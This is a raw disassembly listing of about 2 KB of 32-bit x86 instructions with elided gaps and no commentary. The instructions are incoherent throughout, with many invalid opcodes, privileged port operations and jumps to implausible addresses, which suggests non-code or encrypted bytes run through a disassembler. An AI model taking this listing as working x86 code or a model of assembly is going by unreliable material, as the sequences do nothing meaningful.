  40df77:	in     eax,0x7a
  40df79:	fisub  DWORD PTR [ecx-0x5e8f6019]
  40df7f:	inc    BYTE PTR [ebx-0x11]
  40df82:	idiv   bh
  40df84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df85:	add    al,0x72
  40df87:	scas   eax,DWORD PTR es:[edi]
  40df88:	fld    QWORD PTR [ecx+ebp*8]
  40df8b:	mov    dl,0x7f
  40df8d:	sub    al,0x4a
  40df8f:	inc    esi
  40df90:	mov    ebx,0xfe180e04
  40df95:	cs jecxz 0x40df3a
  40df98:	scas   al,BYTE PTR es:[edi]
  40df99:	or     al,0x11
  40df9b:	push   ebx
  40df9c:	sbb    al,0x9b
  40df9e:	cmc    
  40df9f:	sub    bh,dl
  40dfa1:	add    al,0xfe
  40dfa3:	pusha  
  40dfa4:	xchg   ebp,eax
  40dfa5:	push   0x9bfa4329
  40dfaa:	push   ebx
  40dfab:	adc    BYTE PTR [eax+0x217d5fe],dl
  40dfb1:	lods   eax,DWORD PTR ds:[esi]
  40dfb2:	outs   dx,DWORD PTR ds:[esi]
  40dfb3:	mov    eax,ds:0x4509aec
  40dfb8:	cli    
  40dfb9:	test   eax,0x46992c7e
  40dfbe:	sub    BYTE PTR [edx*8-0x11d222f0],al
  40dfc5:	cdq    
  40dfc6:	sbb    ecx,DWORD PTR [edx+edx*8]
  40dfc9:	xchg   DWORD PTR [ebp-0x16d2435f],ebx
  40dfcf:	add    esp,DWORD PTR [ebp+0x70005b]
	...
  40dfe5:	add    BYTE PTR [eax],bh
  40dfe7:	inc    esp
  40dfe8:	jmp    0x134a0e8d
  40dfed:	add    BYTE PTR [ebp+0x20abe110],bl
  40dff3:	call   0xb0e9:0x515a16d
  40dffa:	inc    edi
  40dffb:	sub    eax,0x53b458a
  40e000:	push   esi
  40e001:	pop    ss
  40e002:	push   es
  40e003:	das    
  40e004:	or     ah,BYTE PTR [ecx+0x38510ce6]
  40e00a:	gs call 0x4600:0x4fa2c3d
  40e012:	fsub   DWORD PTR [ecx]
  40e014:	lods   al,BYTE PTR ds:[esi]
  40e015:	stos   BYTE PTR es:[edi],al
  40e016:	mov    eax,0xf59cff04
  40e01b:	and    ebx,DWORD PTR cs:[esi]
  40e01e:	in     eax,0xc
  40e020:	call   0xfedc3af9
  40e025:	and    BYTE PTR [edx+eax*1],dh
  40e028:	add    BYTE PTR [esi+esi*2+0x5a2582ae],bl
  40e02f:	sub    al,0x0
  40e031:	sub    DWORD PTR [edi],0xffffff9b
  40e034:	je     0x40e017
  40e036:	popa   
  40e037:	dec    eax
  40e038:	pop    edx
  40e039:	out    0x5a,al
  40e03b:	lea    eax,[ebp+ebx*8-0x2f]
  40e03f:	inc    eax
  40e040:	inc    esp
  40e041:	sub    dh,bh
  40e043:	cdq    
  40e044:	je     0x40e027
  40e046:	mov    eax,ds:0xc6ff48
	...
  40e05b:	add    BYTE PTR [edx-0x65428b66],bl
  40e061:	adc    BYTE PTR [eax],cl
  40e063:	shl    eax,0x3e
  40e066:	jmp    FWORD PTR [esi-0x16fc3c40]
  40e06c:	or     al,0x8e
  40e06e:	jmp    0x40e0da
  40e070:	mov    ch,0x9d
  40e072:	imul   ebp,ecx,0x14fed5e7
  40e078:	(bad)  
  40e079:	lods   al,BYTE PTR ds:[esi]
  40e07a:	sbb    al,0x23
  40e07c:	pop    ebx
  40e07d:	call   0x2d53:0x215a2488
  40e084:	cmp    DWORD PTR ds:0xad01f4ff,eax
  40e08a:	sbb    esp,DWORD PTR [esi+0x5a]
  40e08d:	call   0xe174:0x9a5dd4fe
  40e094:	mov    eax,ds:0x9a4e5a41
  40e099:	int3   
  40e09a:	rol    DWORD PTR [eax],0x57
  40e09d:	add    eax,0x80af8b55
  40e0a2:	ret    0x39f8
  40e0a5:	add    eax,0xf31c346a
  40e0aa:	pop    es
  40e0ab:	call   0x3fbf9f
  40e0b0:	retf   0xfc42
  40e0b3:	push   0x41416e
  40e0b8:	cld    
  40e0b9:	repnz pop es
  40e0bb:	call   0x3e44c8
	...
  40e0d0:	add    BYTE PTR [eax],al
  40e0d2:	mov    DWORD PTR ds:0x46677d68,eax
  40e0d8:	add    BYTE PTR [eax+0x7a],ch
  40e0db:	inc    ecx
  40e0dc:	inc    ecx
  40e0dd:	add    BYTE PTR [ebx+edi*4],bl
  40e0e0:	cmp    eax,0xe800d229
  40e0e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e6:	sub    al,0x78
  40e0e8:	std    
  40e0e9:	or     esp,DWORD PTR [ebx+0x16893efd]
  40e0ef:	jns    0x40e157
  40e0f1:	mov    BYTE PTR [ecx+0x41],bh
  40e0f4:	add    BYTE PTR [eax-0x1d],ch
  40e0f7:	add    al,0xef
  40e0f9:	mov    esi,0x4142243b
  40e0fe:	shl    DWORD PTR [edi+0x73],cl
  40e101:	clc    
  40e102:	pop    esp
  40e103:	inc    BYTE PTR [edi]
  40e105:	call   0x3fd93d
  40e10a:	sti    
  40e10b:	mov    BYTE PTR [eax-0x136cc0],bh
  40e111:	jmp    FWORD PTR [edi+esi*1+0x67]
  40e115:	lods   al,BYTE PTR ds:[esi]
  40e116:	loopne 0x40e159
  40e118:	add    bh,bh
  40e11a:	xchg   BYTE PTR [ebp+edi*8+0x75],bh
  40e11e:	mov    ebp,DWORD PTR [esp+esi*2+0x7f]
  40e122:	sbb    al,0x78
  40e124:	std    
  40e125:	jne    0x40e121
  40e127:	xor    eax,0x46ce49ac
  40e12c:	lahf   
  40e12d:	(bad)  
  40e12e:	out    dx,eax
  40e12f:	inc    ecx
  40e130:	lahf   
  40e131:	je     0x40e125
  40e133:	xor    eax,0x5861
	...
  40e148:	push   ebp
  40e149:	iret   
  40e14a:	int3   
  40e14b:	shl    esi,0xad
  40e14e:	aaa    
  40e14f:	mov    edx,DWORD PTR [esi+0x2b]
  40e152:	enter  0xd0fb,0xad
  40e156:	sub    BYTE PTR ds:0xe80a7935,dh
  40e15c:	fwait
  40e15d:	push   esp
  40e15e:	popf   
  40e15f:	(bad)  
  40e160:	jae    0x40e1cb
  40e162:	sahf   
  40e163:	addr16 jae 0x40e1c8
  40e166:	inc    ebx
  40e167:	add    BYTE PTR ds:0x9ae80b19,dl
  40e16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e16e:	popf   
  40e16f:	inc    BYTE PTR ds:0x87fea039
  40e175:	xchg   ebp,eax
  40e176:	stos   BYTE PTR es:[edi],al
  40e177:	mov    edx,DWORD PTR [ebx-0x51]
  40e17a:	popf   
  40e17b:	enter  0xa1b8,0x2
  40e17f:	push   ebp
  40e180:	jno    0x40e133
  40e182:	add    ebx,0x6a0433de
  40e188:	or     al,0x4f
  40e18a:	pop    ss
  40e18b:	or     dl,ah
  40e18d:	popf   
  40e18e:	cmp    edi,edi
  40e190:	lds    edx,FWORD PTR [eax+ecx*2]
  40e193:	cld    
  40e194:	push   edx
  40e195:	sbb    al,0x47
  40e197:	inc    ecx
  40e198:	cli    
  40e199:	outs   dx,BYTE PTR ds:[esi]
  40e19a:	pop    ss
  40e19b:	or     BYTE PTR [edx-0x5a0163aa],ah
  40e1a1:	jle    0x40e1ba
  40e1a3:	cld    
  40e1a4:	popf   
  40e1a5:	nop
  40e1a6:	or     ch,al
  40e1a8:	xor    ebp,esi
  40e1aa:	sahf   
  40e1ab:	inc    BYTE PTR [eax]
	...
  40e1bd:	add    bl,al
  40e1bf:	imul   eax,DWORD PTR [esi],0x0
  40e1c2:	das    
  40e1c3:	add    eax,0xc078af72
  40e1c8:	pop    esp
  40e1c9:	sub    edx,edi
  40e1cb:	sub    bl,BYTE PTR [esi]
  40e1cd:	lahf   
  40e1ce:	out    0xc,al
  40e1d0:	inc    ecx
  40e1d1:	sahf   
  40e1d2:	int    0x97
  40e1d4:	inc    ebp
  40e1d5:	mov    WORD PTR [esi-0x46802f68],?
  40e1db:	inc    ebp
  40e1dc:	jmp    0x414da87f
  40e1e1:	popf   
  40e1e2:	inc    esi
  40e1e3:	xchg   edi,eax
  40e1e4:	and    eax,0x1d98c69e
  40e1e9:	sbb    BYTE PTR [edx],al
  40e1eb:	lods   eax,DWORD PTR ds:[esi]
  40e1ec:	ret    0x2d3c
  40e1ef:	xchg   edi,eax
  40e1f0:	pop    ds
  40e1f1:	sar    ecx,0x4
  40e1f4:	pushf  
  40e1f5:	mov    dl,BYTE PTR [ecx]
  40e1f7:	and    DWORD PTR [edi+ebx*4],0xffffffa3
  40e1fb:	add    al,0x83
  40e1fd:	fisttp DWORD PTR [ecx+edx*1]
  40e200:	loope  0x40e1ad
  40e202:	aaa    
  40e203:	cmp    al,0xe6
  40e205:	popf   
  40e206:	jb     0x40e249
  40e208:	(bad)  [esi+ebx*4]
  40e20b:	inc    ecx
  40e20c:	sub    BYTE PTR [ebp*8-0x49541ef0],al
  40e213:	cwde   
  40e214:	lds    ebx,FWORD PTR [ebp-0x6242ef24]
  40e21a:	dec    esi
  40e21b:	or     eax,0x96259bc1
  40e220:	lods   eax,DWORD PTR ds:[esi]
  40e221:	retf   
	...
  40e232:	add    BYTE PTR [eax],al
  40e234:	mov    ebx,0x7136e901
  40e239:	test   eax,0xad06179d
  40e23e:	push   ecx
  40e23f:	cmp    eax,0xc3e196ad
  40e244:	sub    eax,edi
  40e246:	adc    BYTE PTR [ebp+0x39],dl
  40e249:	inc    esp
  40e24a:	jmp    0x768482
  40e24f:	push   ss
  40e250:	outs   dx,DWORD PTR ds:[esi]
  40e251:	xchg   edi,eax
  40e252:	dec    edi
  40e253:	outs   dx,BYTE PTR ds:[esi]
  40e254:	in     eax,dx
  40e255:	hlt    
  40e256:	dec    edi
  40e257:	in     ax,0xc
  40e25a:	call   0xfed88eb5
  40e25f:	inc    ecx
  40e260:	ret    
  40e261:	cmp    edi,edi
  40e263:	dec    esi
  40e264:	xor    esp,eax
  40e266:	or     ebp,ecx
  40e268:	and    al,0x8a
  40e26a:	jmp    0x40e2d6
  40e26c:	inc    edx
  40e26d:	mov    ss,WORD PTR [esi-0x3d]
  40e270:	stc    
  40e271:	sub    bh,BYTE PTR [ecx]
  40e273:	cs in  eax,dx
  40e275:	or     al,0xe8
  40e277:	xchg   ebp,eax
  40e278:	add    DWORD PTR [esi-0x67428f02],edx
  40e27e:	mov    dl,ah
  40e280:	icebp  
  40e281:	in     al,dx
  40e282:	inc    eax
  40e283:	jmp    0x7d40ba01
  40e288:	std    
  40e289:	sub    al,0xae
  40e28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e28c:	mov    eax,0xa7015704
  40e291:	call   0xc533cb95
  40e296:	jae    0x40e2de
	...
  40e2a8:	add    BYTE PTR [eax],al
  40e2aa:	(bad)  
  40e2ab:	lods   al,BYTE PTR ds:[esi]
  40e2ac:	fld    DWORD PTR [ebp-0x69]
  40e2af:	xchg   esi,eax
  40e2b0:	or     ch,BYTE PTR [ecx+0x24893005]
  40e2b6:	xchg   BYTE PTR [esi-0x4ec3e8c],dl
  40e2bc:	(bad)  
  40e2bd:	xor    al,0x6
  40e2bf:	lods   eax,DWORD PTR ds:[esi]
  40e2c0:	test   DWORD PTR [esi+0x34fe966e],esi
  40e2c6:	sub    bx,WORD PTR [esi+eiz*4]
  40e2ca:	in     al,0xc
  40e2cc:	call   0xfed779f1
  40e2d1:	xchg   esi,eax
  40e2d2:	add    al,0x9d
  40e2d4:	imul   ecx,edx,0x81086
  40e2da:	mov    esp,ebp
  40e2dc:	(bad)  
  40e2dd:	call   DWORD PTR [edx+ebp*8]
  40e2e0:	rol    BYTE PTR [edx+eiz*8+0x0],0xff
  40e2e5:	jne    0x40e2f2
  40e2e7:	push   0x73
  40e2e9:	pop    esi
  40e2ea:	adc    al,0x79
  40e2ec:	or     eax,eax
  40e2ee:	dec    edi
  40e2ef:	xchg   ebx,eax
  40e2f0:	dec    esi
  40e2f1:	dec    DWORD PTR [esi+0x79]
  40e2f4:	dec    esi
  40e2f5:	dec    DWORD PTR [esi+0x9]
  40e2f8:	call   0xfdb9e069
  40e2fd:	call   0x3fbf25
  40e302:	add    al,0xef
  40e304:	imul   eax
  40e306:	retf   
  40e307:	(bad)  
  40e309:	call   DWORD PTR [edi]
  40e30b:	mov    ch,0xbe
  40e30d:	mov    ecx,0x0
	...
  40e31e:	add    BYTE PTR [eax],al
  40e320:	adc    al,0x79
  40e322:	std    
  40e323:	call   DWORD PTR [ecx]
  40e325:	sub    BYTE PTR [edi],dh
  40e327:	pop    es
  40e328:	mov    ?,WORD PTR [ebp-0x3]
  40e32b:	jne    0x40e324
  40e32d:	js     0x40e3a2
  40e32f:	or     bl,ch
  40e331:	xchg   esi,eax
  40e332:	push   esi
  40e333:	inc    DWORD PTR [ecx+ebx*8]
  40e336:	enter  0x1fc2,0x1
  40e33a:	push   ebp
  40e33b:	mov    esp,DWORD PTR [edi]
  40e33d:	jns    0x40e3b2
  40e33f:	or     al,0xcb
  40e341:	dec    edi
  40e342:	pop    esp
  40e343:	inc    esp
  40e345:	add    al,0xc0
  40e347:	je     0x40e31f
  40e349:	loopne 0x40e31a
  40e34b:	inc    esp
  40e34c:	adc    cl,BYTE PTR [ecx]
  40e34e:	push   eax
  40e34f:	call   0x3fb264
  40e354:	rep outs dx,DWORD PTR ds:[esi]
  40e356:	jae    0x40e368
  40e358:	jecxz  0x40e3c9
  40e35a:	jae    0x40e364
  40e35c:	imul   edx,DWORD PTR [ebx+0x6194ffd4],0x6c
  40e363:	pop    edx
  40e364:	cli    
  40e365:	jp     0x40e301
  40e367:	enter  0xb2b8,0x2
  40e36b:	push   ebp
  40e36c:	jno    0x40e3e8
  40e36e:	xchg   bl,al
  40e370:	xchg   edx,eax
  40e371:	sti    
  40e372:	sub    eax,0x99582000
  40e377:	je     0x40e36b
  40e379:	test   DWORD PTR [edx-0x72d482aa],ecx
  40e37f:	inc    esp
  40e380:	jbe    0x40e399
  40e382:	fst    DWORD PTR [edi+0x0]
	...
  40e395:	add    BYTE PTR [edx],ah
  40e397:	pop    ebp
  40e398:	add    al,BYTE PTR [eax+0x590e9e25]
  40e39e:	rcl    dh,cl
  40e3a0:	aas    
  40e3a1:	inc    ecx
  40e3a2:	cli    
  40e3a3:	jp     0x40e34f
  40e3a5:	fstp   DWORD PTR [esi]
  40e3a7:	sahf   
  40e3a8:	add    cl,BYTE PTR [ebx]
  40e3aa:	cmp    bl,BYTE PTR [edx-0x2a]
  40e3ad:	push   esi
  40e3ae:	push   edx
  40e3af:	jmp    0x9776e2da
  40e3b4:	ret    0xe873
  40e3b7:	and    al,0x41
  40e3b9:	clc    
  40e3ba:	and    eax,0x699a79
  40e3bf:	or     edx,DWORD PTR [ecx]
  40e3c1:	or     BYTE PTR [edx],ah
  40e3c3:	sub    al,0x9b
  40e3c5:	dec    BYTE PTR ds:0x90f80f9b
  40e3cb:	rcr    DWORD PTR [ecx+0x1bb5f274],0xff
  40e3d2:	cmc    
  40e3d3:	mov    dl,0x99
  40e3d5:	je     0x40e3c9
  40e3d7:	inc    edi
  40e3d8:	out    0xfe,eax
  40e3da:	outs   dx,DWORD PTR ds:[esi]
  40e3db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3dc:	stos   BYTE PTR es:[edi],al
  40e3dd:	imul   ebx,ebp,0xffffffca
  40e3e0:	cdq    
  40e3e1:	dec    BYTE PTR [edi-0x3a]
  40e3e4:	stos   BYTE PTR es:[edi],al
  40e3e5:	std    
  40e3e6:	xor    ebx,DWORD PTR [ebx-0x67]
  40e3e9:	sti    
  40e3ea:	or     DWORD PTR [esi+0x5b],ebx
  40e3ed:	(bad)  
  40e3ee:	mov    ebp,0xab9aa604
  40e3f3:	(bad)  
  40e3f4:	loopne 0x40e3f8
  40e3f6:	daa    
  40e3f7:	ins    BYTE PTR es:[edi],dx
  40e3f8:	xchg   ebp,eax
  40e3f9:	adc    BYTE PTR [eax],al
	...
  40e40b:	add    BYTE PTR [esi-0x6df3ec6d],ah
  40e411:	daa    
  40e412:	push   ds
  40e413:	fwait
  40e414:	xchg   esp,eax
  40e415:	xor    esi,DWORD PTR [eax+0x1c04f9c5]
  40e41b:	(bad)  
  40e41c:	xchg   ecx,eax
  40e41d:	xchg   DWORD PTR [edi+edx*4+0x2de91f24],esp
  40e424:	xor    DWORD PTR [ebx+edx*8-0x41f69df5],edx
  40e42b:	call   0xd170:0x97a37d64
  40e432:	mov    al,ds:0x6904baeb
  40e437:	fimul  DWORD PTR [ebp+0x17]
  40e43a:	test   eax,0xa848212b
  40e43f:	add    esp,DWORD PTR [ebp+0x35e7b89c]
  40e445:	xchg   ebx,eax
  40e446:	icebp  
  40e447:	ret    
  40e448:	test   eax,0xa8abbde7
  40e44d:	daa    
  40e44e:	push   cs
  40e44f:	call   0x1cc5:0xfc7cc4f0
  40e456:	jmp    0x8093015e
  40e45b:	mov    al,ds:0x33e945b9
  40e460:	std    
  40e461:	sbb    cl,dh
  40e463:	stos   DWORD PTR es:[edi],eax
  40e464:	pop    edx
  40e465:	adc    ebx,esi
  40e467:	cdq    
  40e468:	aad    0x80
  40e46a:	das    
  40e46b:	cdq    
  40e46c:	in     al,0x91
  40e46e:	sbb    esp,eax
	...
  40e480:	add    BYTE PTR [eax],al
  40e482:	mov    ds:0xd499c592,al
  40e487:	xchg   edi,eax
  40e488:	mov    ds,esp
  40e48a:	hlt    
  40e48b:	pop    ss
  40e48c:	add    BYTE PTR [ecx-0x5103e69d],ch
  40e492:	in     eax,dx
  40e493:	cld    
  40e494:	out    0x9b,eax
  40e496:	call   0xc17fe32c
  40e49b:	les    eax,FWORD PTR [ebx]
  40e49d:	jmp    0x6b2c6276
  40e4a2:	mov    edx,0xcc482aa
  40e4a7:	loopne 0x40e4e9
  40e4a9:	jmp    0xa044fca7
  40e4ae:	mov    esp,0xf602fffe
  40e4b3:	push   ds
  40e4b4:	add    bl,dl
  40e4b6:	xchg   edx,eax
  40e4b7:	xchg   ebx,eax
  40e4b8:	je     0x40e4a7
  40e4ba:	pop    ds
  40e4bb:	add    eax,0xe891e96a
  40e4c0:	sub    ch,cl
  40e4c2:	stc    
  40e4c3:	jnp    0x40e509
  40e4c5:	inc    ecx
  40e4c6:	jae    0x40e4e1
  40e4c8:	clc    
  40e4c9:	push   ecx
  40e4ca:	or     BYTE PTR [edi+edi*8],ch
  40e4cd:	ss jno 0x40e519
  40e4d0:	cld    
  40e4d1:	cs in  eax,dx
  40e4d3:	mov    esi,?
  40e4d5:	pushf  
  40e4d6:	lea    ebx,[edi+edi*8]
  40e4d9:	push   ds
  40e4da:	std    
  40e4db:	add    BYTE PTR [edx-0x17],ch
  40e4de:	xlat   BYTE PTR ds:[ebx]
  40e4df:	add    al,0xe8
  40e4e1:	in     eax,0xe
  40e4e3:	xchg   edx,eax
  40e4e4:	(bad)  
  40e4e5:	je     0x40e4e7
	...
  40e4f7:	add    ch,dl
  40e4f9:	cwde   
  40e4fa:	dec    edi
  40e4fb:	xchg   ebx,eax
  40e4fc:	stc    
  40e4fd:	push   ds
  40e4fe:	add    BYTE PTR [ebx-0x11ffe3f1],al
  40e504:	in     al,dx
  40e505:	nop
  40e506:	(bad)  
  40e507:	cld    
  40e508:	ins    BYTE PTR es:[edi],dx
  40e509:	loopne 0x40e54b
  40e50b:	jmp    0x614f377c
  40e510:	jno    0x40e4a3
  40e512:	(bad)  
  40e513:	jmp    0x1351d86
  40e518:	dec    eax
  40e519:	cwde   
  40e51a:	mov    eax,DWORD PTR [ebp-0x6d]
  40e51d:	aad    0x69
  40e51f:	add    BYTE PTR [ecx],bh
  40e521:	fwait
  40e522:	push   0x45033b00
  40e527:	inc    ecx
  40e528:	mov    ds:0x8cf4736c,eax
  40e52d:	xlat   BYTE PTR ds:[ebx]
  40e52e:	jne    0xff9fd287
  40e534:	push   es
  40e535:	jns    0x40e51d
  40e537:	stos   DWORD PTR es:[edi],eax
  40e538:	repz imul edi,ebp,0xffffff89
  40e53c:	(bad)  
  40e53d:	pusha  
  40e53e:	or     eax,eax
  40e540:	xchg   DWORD PTR ds:0x5d7b75ff,edi
  40e546:	jmp    0x40e5a0
  40e548:	fsubr  QWORD PTR [edi+eax*4+0x45]
  40e54c:	mov    edi,0xbbf0736c
  40e551:	aaa    
  40e552:	push   ecx
  40e553:	jmp    FWORD PTR [esp+ebp*2+0x2bce873]
  40e55a:	in     al,dx
  40e55b:	inc    DWORD PTR [eax]
	...
  40e56d:	add    BYTE PTR [esi+0x622ce675],al
  40e573:	ins    BYTE PTR es:[edi],dx
  40e574:	std    
  40e575:	or     edx,DWORD PTR [ebx]
  40e577:	add    bl,BYTE PTR [ebx]
  40e579:	push   0xbeef0523
  40e57e:	or     al,0x3
  40e580:	or     al,ch
  40e582:	inc    esi
  40e583:	loop   0x40e583
  40e585:	(bad)  
  40e586:	in     al,dx
  40e587:	add    ch,al
  40e589:	call   DWORD PTR [esi+0xb75fd69]
  40e58f:	pop    ebp
  40e590:	pop    ebx
  40e591:	push   ebp
  40e592:	or     al,0x79
  40e594:	std    
  40e595:	jne    0x40e596
  40e597:	pop    ebp
  40e598:	xchg   esp,eax
  40e599:	pop    eax
  40e59a:	fdivr  QWORD PTR [eax-0x3]
  40e59d:	jne    0x40e572
  40e59f:	popa   
  40e5a0:	stc    
  40e5a1:	dec    edi
  40e5a2:	cli    
  40e5a3:	mov    dh,0x96
  40e5a5:	mov    al,BYTE PTR [edi-0x46]
  40e5a8:	mov    dl,BYTE PTR [ecx]
  40e5aa:	aad    0xd1
  40e5ac:	(bad)  
  40e5ad:	(bad)  
  40e5ae:	sub    BYTE PTR [esi-0x39398b6b],dl
  40e5b4:	sbb    bl,BYTE PTR [eax-0x43]
  40e5b7:	pop    edi
  40e5b8:	int3   
  40e5b9:	rol    DWORD PTR [esi],0x9e
  40e5bc:	das    
  40e5bd:	mov    ebx,DWORD PTR [esi-0x6df3ef91]
  40e5c3:	xor    edi,DWORD PTR [eax]
  40e5c5:	call   FWORD PTR [ebp-0x1c8c3d5d]
  40e5cb:	cmc    
  40e5cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5cd:	inc    ebx
  40e5ce:	cmp    ebx,DWORD PTR [esi+0xe832]
	...
  40e5e4:	sub    bh,dl
  40e5e6:	xchg   esi,eax
  40e5e7:	(bad)  
  40e5e8:	sub    al,BYTE PTR [esi]
  40e5ea:	inc    ebp
  40e5eb:	mov    edi,0x2a9dba
  40e5f0:	cli    
  40e5f1:	ds push esi
  40e5f3:	jmp    DWORD PTR [bx+si+0x43]
  40e5f7:	add    dl,cl
  40e5f9:	adc    DWORD PTR ds:[eax],ecx
  40e5fc:	bound  esi,QWORD PTR [esi+0x364dff19]
  40e602:	xlat   BYTE PTR ds:[ebx]
  40e603:	push   edi
  40e604:	inc    ebp
  40e605:	xlat   BYTE PTR ds:[ebx]
  40e606:	xchg   esi,eax
  40e607:	je     0x40e5f7
  40e609:	inc    ebp
  40e60a:	jle    0x40e667
  40e60c:	xor    eax,0xa6c00ae7
  40e611:	mov    ah,0x2a
  40e613:	idiv   BYTE PTR [esi+0x1250025c]
  40e619:	xchg   ebx,eax
  40e61a:	call   DWORD PTR ss:0x4d412a6e
  40e621:	pop    esi
  40e622:	add    ch,BYTE PTR [eax-0x6]
  40e625:	popf   
  40e626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e627:	mov    ebp,0x413fa892
  40e62c:	cli    
  40e62d:	add    al,0x39
  40e62f:	xchg   edi,eax
  40e630:	data16 std 
  40e632:	rcl    dl,1
  40e634:	pusha  
  40e635:	nop
  40e636:	aad    0xab
  40e638:	repz sub al,0xce
  40e63b:	xchg   esi,eax
  40e63c:	ret    0xf0c2
  40e63f:	add    esp,DWORD PTR [edi]
  40e641:	jl     0x40e60f
  40e643:	cmp    BYTE PTR [ecx+0x44290],0x0
	...
  40e65a:	push   eax
  40e65b:	shr    DWORD PTR [ebp-0x2b62fdf0],1
  40e661:	xor    BYTE PTR [ebp-0x59bf9071],ch
  40e667:	sbb    dh,bl
  40e669:	xchg   esi,eax
  40e66a:	es std 
  40e66c:	adc    BYTE PTR [ebx],0x95
  40e66f:	pop    DWORD PTR [ebp-0xc7026d7]
  40e675:	or     edx,DWORD PTR [edx+0x7c967626]
  40e67b:	sbb    cl,ch
  40e67d:	xchg   esi,eax
  40e67e:	out    dx,al
  40e67f:	cld    
  40e680:	push   eax
  40e681:	aaa    
  40e682:	ins    DWORD PTR es:[edi],dx
  40e683:	(bad)  
  40e684:	pop    ebp
  40e685:	xchg   esi,eax
  40e686:	out    dx,al
  40e687:	nop
  40e688:	push   ebp
  40e689:	adc    dl,dh
  40e68b:	pushf  
  40e68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68d:	xor    BYTE PTR [ebp-0x71],dl
  40e690:	das    
  40e691:	sar    ecx,0x4
  40e694:	xchg   esp,eax
  40e695:	mov    dl,BYTE PTR [ecx-0x71]
  40e698:	mov    ebx,0x8cfc5207
  40e69d:	xchg   esi,eax
  40e69e:	xor    al,0xfb
  40e6a0:	sub    BYTE PTR [edi],cl
  40e6a2:	(bad)  
  40e6a3:	sbb    al,0xfd
  40e6a5:	inc    eax
  40e6a6:	mov    ebx,0x7eabb904
  40e6ab:	sub    ecx,DWORD PTR [esi]
  40e6ad:	xchg   esi,eax
  40e6ae:	lds    ebx,FWORD PTR [ecx+ebp*8]
  40e6b1:	add    ebx,DWORD PTR ds:0xbee6904e
  40e6b7:	inc    ebp
  40e6b8:	add    cl,ch
  40e6ba:	leave  
  40e6bb:	(bad)  
  40e6bc:	je     0x40e69f
	...
  40e6ce:	add    BYTE PTR [eax],al
  40e6d0:	mov    eax,ds:0x87e67c29
  40e6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d6:	nop
  40e6d7:	ss (bad) 
  40e6d9:	vpcomud xmm0,xmm2,XMMWORD PTR [edx*2-0x3c7c5d9e],0xc5
  40e6e4:	and    BYTE PTR ds:0x196efc6a,al
  40e6ea:	or     cl,al
  40e6ec:	sub    esi,DWORD PTR [edx]
  40e6ee:	jmp    FWORD PTR [esi+0x13fc4981]
  40e6f4:	mov    al,0x8f
  40e6f6:	je     0x40e6e9
  40e6f8:	push   ecx
  40e6f9:	pop    esp
  40e6fa:	(bad)  
  40e6fb:	xchg   esi,eax
  40e6fc:	xchg   DWORD PTR [ebx+eiz*1],ebx
  40e6ff:	mov    es,WORD PTR ds:0x6749e7fd
  40e705:	(bad)  
  40e706:	(bad)  
  40e707:	adc    eax,DWORD PTR [edx+0x51e1748f]
  40e70d:	js     0x40e70d
  40e70f:	outs   dx,BYTE PTR ds:[esi]
  40e710:	(bad)  
  40e711:	(bad)  
  40e712:	je     0x40e779
  40e714:	xchg   DWORD PTR [ecx],ebx
  40e716:	or     BYTE PTR [ecx+0x3d],dl
  40e719:	xor    bh,bh
  40e71b:	push   esi
  40e71c:	xor    esp,eax
  40e71e:	add    ebp,ecx
  40e720:	and    al,0x7a
  40e722:	jmp    0x40e78e
  40e724:	cmp    dl,BYTE PTR [esi+0x1af9d356]
  40e72a:	ds ss in eax,dx
  40e72d:	cld    
  40e72e:	out    0xb9,eax
  40e730:	in     eax,0x8d
  40e732:	(bad)  
  40e733:	jo     0x40e735
	...
  40e745:	add    ch,ch
  40e747:	nop
  40e748:	mov    bl,ah
  40e74a:	loope  0x40e728
  40e74c:	inc    eax
  40e74d:	jmp    0x9540b6cb
  40e752:	(bad)  
  40e753:	sbb    al,0x37
  40e755:	add    BYTE PTR [esi+0x43],bl
  40e758:	add    BYTE PTR [edi-0x15],dl
  40e75b:	sub    ebp,DWORD PTR [eax]
  40e75d:	add    BYTE PTR [ebx],dl
  40e75f:	std    
  40e760:	mov    edi,0xe7e0b974
  40e765:	fiadd  WORD PTR [ebx+0x78]
  40e768:	std    
  40e769:	or     edx,DWORD PTR [ebx+0xe891ffd]
  40e76f:	jno    0x40e7d7
  40e771:	add    bl,ah
  40e773:	push   0xce2368bc
  40e778:	inc    eax
  40e779:	add    BYTE PTR [esi+edi*8+0xfefff7],al
  40e780:	call   0xfdb8d04d
  40e785:	dec    DWORD PTR [esi]
  40e787:	jno    0x40e76f
  40e789:	icebp  
  40e78a:	in     eax,dx
  40e78b:	ja     0x40e78a
  40e78d:	cld    
  40e78e:	rol    cl,0xb7
  40e791:	inc    DWORD PTR [eax+edi*2-0x55da0d03]
  40e798:	add    eax,0x73793a75
  40e79d:	cld    
  40e79e:	add    al,0xff
  40e7a0:	pop    es
  40e7a1:	call   0x3fbcb3
  40e7a6:	xor    al,0xba
  40e7a8:	rol    BYTE PTR [eax+eax*1],0x0
	...
  40e7bc:	push   ebx
  40e7bd:	fimul  WORD PTR [edx-0x1db22f14]
  40e7c3:	push   edi
  40e7c4:	cmp    DWORD PTR [ecx],eax
  40e7c6:	push   0x3f
  40e7c8:	mov    ah,0xfe
  40e7ca:	pop    es
  40e7cb:	call   0x3fbc8b
  40e7d0:	fcmove st,st(6)
  40e7d2:	sti    
  40e7d3:	mov    esp,DWORD PTR [esi]
  40e7d5:	leave  
  40e7d6:	daa    
  40e7d7:	inc    ecx
  40e7d8:	and    eax,DWORD PTR [ecx-0x2f70ffc3]
  40e7de:	addr16 inc ebp
  40e7e0:	cli    
  40e7e1:	pusha  
  40e7e2:	inc    ecx
  40e7e3:	add    BYTE PTR [ebp-0x5d6bffd],ch
  40e7e9:	fwait
  40e7ea:	pop    es
  40e7eb:	ror    BYTE PTR [esi-0x6b17d44f],0x7b
  40e7f2:	xchg   ebx,eax
  40e7f3:	inc    BYTE PTR [ecx]
  40e7f5:	fimul  WORD PTR [esi]
  40e7f7:	and    BYTE PTR [ebx-0x5987427],al
